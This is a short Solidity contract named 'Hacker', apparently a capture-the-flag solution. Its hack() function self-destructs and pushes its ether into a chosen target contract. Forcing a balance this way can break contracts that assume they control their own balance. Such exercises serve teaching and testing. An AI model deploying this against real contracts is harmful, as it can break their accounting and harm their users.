// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hacker {
    address public target;

    constructor(address target_) {
        target = target_;
    }

    function hack() external payable {
        selfdestruct(payable(target));
    }
}
